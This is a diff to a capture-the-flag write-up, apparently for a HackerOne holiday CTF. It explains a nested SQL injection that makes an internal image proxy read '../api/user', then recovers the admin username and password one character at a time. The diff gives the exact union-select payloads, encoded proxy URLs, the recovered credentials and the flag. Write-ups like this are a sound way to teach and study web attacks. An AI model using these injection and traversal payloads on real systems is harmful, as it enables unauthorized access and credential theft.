@@ -453,20 +453,59 @@ Thanks to SqlMap, I quickly discover the architecture of the database, but no in
 
 After being stuck for a while, I understood the hint given by Hackerone : 
 
-<!-- blank line -->
-<figure class="video_container">
-  <iframe src="https://video.twimg.com/tweet_video/Ep883LVUYAEHY8g.mp4" frameborder="0" allowfullscreen="true"> </iframe>
-</figure>
-<!-- blank line -->
+![cf_array](./images/inception.png)
+
+**It is about the inception movie !**  
+
+From there I understood that I had to use the first SQL injection to make a second one !  
+We know the architecture of the **album** table which is the following :  
+
+```
++----+--------+-----------+
+| id | hash   | name      |
++----+--------+-----------+
+| 1  | 3dir42 | Xmas 2018 |
+| 2  | 59grop | Xmas 2019 |
+| 3  | jdh34k | Xmas 2020 |
++----+--------+-----------+
+```
+
+Thanks to this, we know the number of columns (3), so we can try to make a second sql injection in the first one !   
+
+**Of course, all this being automated, I pass my hours of misery to you !**  
+
+My final payload looks like : ```1' union select "1' union select NULL,NULL,'../api/user'-- -",2,3+--+-``` where ```../api/user``` is the internal path.  
+To detect it, we can see that at each payload, an image is added with its new link : 
+
+```
+src="/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLy4uXC9hcGlcL3VzZXIiLCJhdXRoIjoiYmZiNmRkMDRlNjZlODU1NjRkZWJiYTNlN2IyMjJlMzQifQ==">
+Decoded : {"image":"r3c0n_server_4fdk59\/uploads\/..\/api\/user","auth":"bfb6dd04e66e85564debba3e7b222e34"}
+```
+
+![cf_array](./images/11-img.png) 
 
 
+Trying to see the image, we have several answers: 
+- Expected HTTP status 200, Received: 204
+- Expected HTTP status 200, Received: 404
+- Invalid content type detected 
 
+The most important is the last one, it tells us that the path is valid !   
 
+**We have to keep in mind that we have to find an account in order to connect to the previous interface !**  
 
+Now, you have to focus on response message and get paths to retrieve credentials ! 
+I finally managed to retrieve the paths ```../api/user?username``` and ```../api/user?password```.  
 
+From there, I oriented my script in order to test and find each valid character.   
+For example, for the first character : ```1' union select "1' union select NULL,NULL,'../api/user?username=g%'-- -",2,3+--+-```, which gives us the following url : ```/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLy4uXC9hcGlcL3VzZXI/dXNlcm5hbWU9ZyUiLCJhdXRoIjoiZThiN2EwNWFiMDRmM2MxMTY1Yzc5ZDA4ZDMzMTE2OWEifQ==```.  
+Her answer: **Invalid content type detected**, So we have the first valid character for the username !  
 
+By testing all the characters of the ASCII table, we are then able to retrieve the username **grinchadmin** and we will do the same with the password, which finally will be : **s4nt4sucks**  
 
+Login on Attack Box with these credentials and get the flag ! 
 
+**FLAG : flag{07a03135-9778-4dee-a83c-7ec330728e72}**
 
 
 ## Day 12 - Grinch Network Attack Server
